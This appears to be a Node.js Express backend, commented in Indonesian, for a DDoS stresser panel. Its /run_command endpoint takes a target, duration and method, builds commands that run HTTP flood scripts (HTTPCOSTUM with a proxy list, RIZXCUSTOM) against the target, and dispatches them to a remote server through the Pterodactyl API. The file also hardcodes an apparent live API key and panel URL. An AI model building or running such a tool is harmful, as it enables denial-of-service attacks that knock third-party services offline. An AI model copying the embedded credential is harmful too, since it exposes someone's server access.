const express = require('express');
const bodyParser = require('body-parser');
const fetch = require('node-fetch');

const app = express();
app.use(bodyParser.json());

// Pastikan PTERO_API_KEY dan PANEL_URL sudah benar
const PTERO_API_KEY = 'ptla_p5dvi3VyNHPVNRwKR6XenOaoHAZHiYnu6Brg1UD5Nbv';  // Ganti dengan API Key yang benar
const PANEL_URL = 'https://xvoidmark.modzz.site';  // Pastikan ini adalah URL yang benar
const SERVER_ID = '782feeb1';  // Pastikan ini adalah Server ID yang benar

app.post('/run_command', async (req, res) => {
  const { target, duration, method } = req.body;

  // Validasi input dari frontend
  if (!target || !duration || !method) {
    return res.status(400).json({error: 'Semua field harus diisi'});
  }

  console.log('Data yang diterima:', { target, duration, method });

  // Tentukan perintah yang sesuai dengan metode yang dipilih
  let command = '';
  if (method === 'http') {
    command = `node /system/HTTPCOSTUM GET ${target} ${duration} 16 90 proxy.txt`;
  } else if (method === 'rizx') {
    command = `node /system/RIZXCUSTOM ${target} ${duration}`;
  } else {
    return res.status(400).json({error: 'Metode tidak dikenali'});
  }

  // Kirim perintah ke API Pterodactyl
  try {
    console.log('Mengirim perintah ke Pterodactyl API...');

    const response = await fetch(`${PANEL_URL}/api/client/servers/${SERVER_ID}/command`, {
      method: 'POST',
      headers: {
        'Authorization': `Bearer ${PTERO_API_KEY}`,  // API Key Pterodactyl
        'Content-Type': 'application/json',
        'Accept': 'application/json'
      },
      body: JSON.stringify({ command: command })
    });

    const data = await response.json();

    if (!response.ok) {
      console.log('Error Pterodactyl API:', data);  // Log error dari API Pterodactyl
      return res.status(response.status).json({error: data.errors || data});
    }

    // Kirim respon sukses
    res.json({message: 'Perintah berhasil dikirim ke server', data});
  } catch (err) {
    // Tangani error dari fetch atau koneksi API
    console.error('Error dalam pengiriman perintah:', err);
    res.status(500).json({error: err.message});
  }
});

const PORT = 3000;
app.listen(PORT, () => {
  console.log(`Server backend berjalan di http://localhost:${PORT}`);
});
